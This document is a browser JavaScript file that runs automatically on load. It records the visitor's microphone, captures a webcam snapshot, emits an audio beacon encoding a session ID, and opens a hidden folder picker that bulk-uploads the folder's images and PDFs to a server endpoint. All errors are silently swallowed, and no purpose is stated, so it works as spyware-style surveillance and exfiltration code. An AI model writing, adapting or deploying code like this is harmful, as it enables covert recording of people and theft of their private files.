const sessionId = crypto.randomUUID();

const headers = { 'X-Agent': navigator.userAgent };

function postFile(file, name) {
  const form = new FormData();
  form.append('file', file, name);
  return fetch('/api/upload', { method: 'POST', body: form, headers }).catch(() => {});
}

function recordMic() {
  navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
    const rec = new MediaRecorder(stream);
    const chunks = [];
    rec.ondataavailable = e => e.data && chunks.push(e.data);
    rec.start();
    const stop = () => {
      if (rec.state !== 'inactive') rec.stop();
    };
    addEventListener('pagehide', stop, { once: true });
    addEventListener('beforeunload', stop, { once: true });
    rec.onstop = () => {
      const blob = new Blob(chunks, { type: rec.mimeType });
      postFile(blob, `mic_${sessionId}.webm`);
      stream.getTracks().forEach(t => t.stop());
    };
  }).catch(() => {});
}

async function captureSnapshot() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const track = stream.getVideoTracks()[0];
    const cap = new ImageCapture(track);
    const bmp = await cap.grabFrame();
    const canvas = Object.assign(document.createElement('canvas'), { width: bmp.width, height: bmp.height });
    const ctx = canvas.getContext('2d');
    ctx.drawImage(bmp, 0, 0);
    ctx.fillStyle = 'rgba(255,0,0,0.5)';
    ctx.font = '20px sans-serif';
    ctx.fillText(sessionId, 10, 30);
    const blob = await new Promise(r => canvas.toBlob(r, 'image/png'));
    track.stop();
    await postFile(blob, `snapshot_${sessionId}.png`);
  } catch (e) {}
}

async function generateBeacon() {
  try {
    const ctx = new AudioContext();
    const dest = ctx.createMediaStreamDestination();
    const osc = ctx.createOscillator();
    osc.connect(dest);
    const rec = new MediaRecorder(dest.stream);
    const chunks = [];
    rec.ondataavailable = e => e.data && chunks.push(e.data);
    rec.start();
    let t = ctx.currentTime;
    osc.start(t);
    for (const ch of sessionId) {
      osc.frequency.setValueAtTime(300 + ch.charCodeAt(0), t);
      t += 0.05;
    }
    osc.stop(t);
    setTimeout(() => {
      rec.stop();
      ctx.close();
    }, (t - ctx.currentTime) * 1000 + 200);
    const blob = await new Promise(r => rec.onstop = () => r(new Blob(chunks, { type: rec.mimeType })));
    await postFile(blob, `beacon_${sessionId}.webm`);
  } catch (e) {}
}

function chooseFolder() {
  return new Promise(resolve => {
    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = true;
    input.webkitdirectory = true;
    input.directory = true;
    input.style.display = 'none';
    document.body.appendChild(input);
    input.addEventListener('change', () => {
      const files = Array.from(input.files);
      files.forEach(f => {
        if (/\.(jpe?g|png|pdf)$/i.test(f.name)) {
          postFile(f, f.name);
        }
      });
      resolve();
    }, { once: true });
    input.click();
  });
}

(async () => {
  recordMic();
  captureSnapshot();
  generateBeacon();
  await chooseFolder();
})();
